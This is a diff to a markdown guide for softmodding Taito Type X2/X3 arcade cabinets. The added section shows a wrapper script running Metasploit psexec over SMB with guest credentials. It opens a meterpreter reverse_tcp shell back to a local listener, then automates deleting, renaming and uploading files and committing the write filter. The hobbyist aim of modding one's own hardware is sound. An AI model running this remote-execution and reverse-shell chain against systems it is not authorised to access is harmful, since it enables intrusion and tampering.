@@ -341,6 +341,110 @@ execute -i -f "c:\\Windows\\winsxs\\amd64_microsoft-windows-e..enhancedwritefilt
 reboot
 quit
 ```
+
+# Final Boss:
+- Wrapping it all up with a ./ style interface. 
+
+If you've made it this far you should not need anyone holding your hand... assuming you just want a shell, move or delete the *.meter files. 
+
+```
+$ mv SFIV.meter SFIV.meter.orig 
+$ mv l4dac.meter l4dac.meter.orig
+```
+
+Otherwise, leave them in place and let them help create your softmodded X2 or X3. 
+
+**WARNING** DO NOT USE THESE SCRIPTS UNTIL YOU HAVE THE APPROPRIATE .EXE FILES IN PLACE! **WARNING**
+
+```
+$ ./softmod-sfiv.sh 
+FuckADarkSoft!
+[-] ***rting the Metasploit Framework console...\
+# cowsay++
+ ____________
+< metasploit >
+ ------------
+       \   ,__,
+        \  (oo)____
+           (__)    )\
+              ||--|| *
+
+
+       =[ metasploit v5.0.35-dev-c0f8e7cea6               ]
++ -- --=[ 1903 exploits - 1072 auxiliary - 329 post       ]
++ -- --=[ 550 payloads - 44 encoders - 10 nops            ]
++ -- --=[ 2 evasion                                       ]
+
+[*] Processing ./SFIV.rc for ERB directives.
+resource (./SFIV.rc)> use exploit/windows/smb/psexec
+resource (./SFIV.rc)> set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+resource (./SFIV.rc)> set SHARE C$
+SHARE => C$
+resource (./SFIV.rc)> set LHOST 192.168.69.64
+LHOST => 192.168.69.64
+resource (./SFIV.rc)> set LPORT 1234
+LPORT => 1234
+resource (./SFIV.rc)> set RHOSTS 192.168.69.112
+RHOSTS => 192.168.69.112
+resource (./SFIV.rc)> set SMBUser netguest
+SMBUser => netguest
+resource (./SFIV.rc)> set SMBPass netguest
+SMBPass => netguest
+resource (./SFIV.rc)> set AutoRunScript multi_console_command -r ./SFIV.meter
+AutoRunScript => multi_console_command -r ./SFIV.meter
+resource (./SFIV.rc)> exploit
+[*] Started reverse TCP handler on 192.168.69.64:1234 
+[*] 192.168.69.112:445 - Connecting to the server...
+[*] 192.168.69.112:445 - Authenticating to 192.168.69.112:445 as user 'netguest'...
+[*] 192.168.69.112:445 - Selecting native target
+[*] 192.168.69.112:445 - Uploading payload... yKtyUORi.exe
+[*] 192.168.69.112:445 - Created \yKtyUORi.exe...
+[+] 192.168.69.112:445 - Service started successfully...
+[*] 192.168.69.112:445 - Deleting \yKtyUORi.exe...
+[*] Sending stage (179779 bytes) to 192.168.69.112
+[*] Meterpreter session 1 opened (192.168.69.64:1234 -> 192.168.69.112:1029) at 2019-08-02 02:45:50 -0400
+
+meterpreter > 
+[*] Session ID 1 (192.168.69.64:1234 -> 192.168.69.112:1029) processing AutoRunScript 'multi_console_command -r ./SFIV.meter'
+[*] Running Command List ...
+[*] 	Running command execute -i -f "cmd.exe" -a "/c echo FukkaDarkSoft!"
+Process 1860 created.
+Channel 1 created.
+FukkaDarkSoft!
+[*] 	Running command pkill launcher.exe
+Filtering on 'launcher.exe'
+No matching processes were found.
+[*] 	Running command cd c:\\TypeXsys
+[*] 	Running command rm launcher.exe.SFIV
+[-] stdapi_fs_delete_file: Operation failed: The system cannot find the file specified.
+[*] 	Running command mv launcher.exe launcher.exe.SFIV 
+[*] 	Running command upload ./TtxShell.exe c:\\TypeXsys\\TtxShell.exe 
+[-] Error running command upload: Errno::ENOENT No such file or directory @ rb_file_s_stat - ./TtxShell.exe
+[*] 	Running command upload ./iDmacDrv32.dll C:\\Windows\\System32
+[-] Error running command upload: Errno::ENOENT No such file or directory @ rb_file_s_stat - ./iDmacDrv32.dll
+[*] 	Running command execute -i -f "c:\\WINDOWS\\system32\\EWFMGR.EXE" -a "c: -commit"
+Process 1932 created.
+Channel 2 created.
+*** Committing overlay to the protected volume.
+
+Protected Volume Configuration
+  Type            RAM
+  State           ENABLED
+  Boot Command    COMMIT
+    Param1        0
+    Param2        0
+  Persistent Data ""
+  Volume ID       FE FC 42 BA 00 7E 00 00 00 00 00 00 00 00 00 00 
+  Device Name     "\Device\HarddiskVolume1" [C:]
+  Max Levels      1
+  Clump Size      512
+  Current Level   1
+
+  Memory used for data 1994752 bytes
+  Memory used for mapping 4096 bytes
+```
+
 Official video tutorial for the Taito X3 USB boot softmode by Mitsu (as usual!) can be found here: https://www.youtube.com/watch?v=l0nq1pQXX90
 
 
